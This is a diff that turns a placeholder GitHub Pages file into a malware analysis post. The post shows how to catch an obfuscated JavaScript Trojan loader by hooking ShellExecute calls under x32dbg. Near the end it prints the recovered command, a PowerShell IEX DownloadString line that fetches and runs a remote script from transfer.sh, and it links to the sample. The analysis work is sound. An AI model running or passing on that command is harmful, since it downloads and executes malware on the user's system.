@@ -1,37 +1,43 @@
-## Welcome to GitHub Pages
+Analysis of a JavaScript loader by hooking Windows API functions.
 
-You can use the [editor on GitHub](https://github.com/Koi0x/Agent-Trojan-JavaScript-Loader-Analysis/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+`Hash: a3937eb4681dc2a090360d9220c42ca25b51075542902a647839fe5f3c892097`
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+`Sample:  [Here](https://bazaar.abuse.ch/sample/a3937eb4681dc2a090360d9220c42ca25b51075542902a647839fe5f3c892097/#intel)`
 
-### Markdown
+***Overview***
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Obfuscated JavaScript dropper which downloads the next stage for a Trojan. When trying to view the JavaScript, we can see that it is highly obfuscated.
 
-```markdown
-Syntax highlighted code block
+![image](https://user-images.githubusercontent.com/95584654/159395273-2e779564-f2f4-4ab7-84b5-6b3368709c5e.png)
 
-# Header 1
-## Header 2
-### Header 3
+While we could try and figure out how to deobfuscate the loader, we can bypass this by hooking Windows API functions from shell32.dll.
 
-- Bulleted
-- List
+We can use x32dbg to hook functions like ShellExecuteExW and or ShellExecuteExA to catch the loader before it executes any commands to reach out and download the next stage.
 
-1. Numbered
-2. List
+Review my other blog post [here](https://koi0x.github.io/Hooking-Windows-API-Functions-to-Analyze-JavaScript-VBScript-loaders/) for a reference.
 
-**Bold** and _Italic_ and `Code` text
+***Debugging The Loader***
 
-[Link](url) and ![Image](src)
-```
+Firstly, we need to load wscript.exe into x32dbg. We need to do this because wscript.exe is the application that will act as the proxy between the JavaScript loader and the Windows API. You can find this in `C:\Windows\SysWOW64\wscript.exe`
 
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
+Next, edit the command line to pass in the loader to be run with wscript.exe. Do this by going to `File -> Change Command Line`
 
-### Jekyll Themes
+Set a breakpoint on shell32.dll. We need to break when the DLL is loaded into memory so we can then set breakpoints on the imports.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Koi0x/Agent-Trojan-JavaScript-Loader-Analysis/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+![image](https://user-images.githubusercontent.com/95584654/159395305-f681217b-dbae-4c9f-89dd-73fa665030d9.png)
 
-### Support or Contact
+Now we need to set breakpoints on common function calls that are used to execute shell commands. Navigate to the symbols page and find shell32.dll and then search for ShellExecute. This will return all of the Windows API functions that will execute shell commands. Remember that we do not know what function is exactly being used in the loader. Given this, it is best practice to set breakpoints on all of them to have a fallback.
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+![image](https://user-images.githubusercontent.com/95584654/159395358-27c03409-731b-40e9-b1ec-cf89e11f831a.png)
+
+Now with the breakpoint set, we can go ahead and continue the execution of the loader. At this point, we will hit a breakpoint on the function ShellExecuteExW.
+
+![image](https://user-images.githubusercontent.com/95584654/159395404-7b326a99-5ce4-4366-9f7b-a4ffb7619322.png)
+
+At this point, we can look at the current stack frame to see the parameters that are being passed into the ShellExecuteExW function. Reviewing the stack frame, we can see the loader is calling the following:
+
+`Powershell.exe IEX(New-Object Net.Webclient).DownloadString('https://transfer.sh/get/kVRjSF/ttttyyyyyyy.ps1')`
+
+![image](https://user-images.githubusercontent.com/95584654/159395443-ccd5d2c5-a97b-463c-90f4-6055c6be2620.png)
+
+While I am not going to look further into this sample chain, I mainly wanted to write this as another example of my other blog post about hooking Windows API functions to analyze JavaScript and VBS loaders.
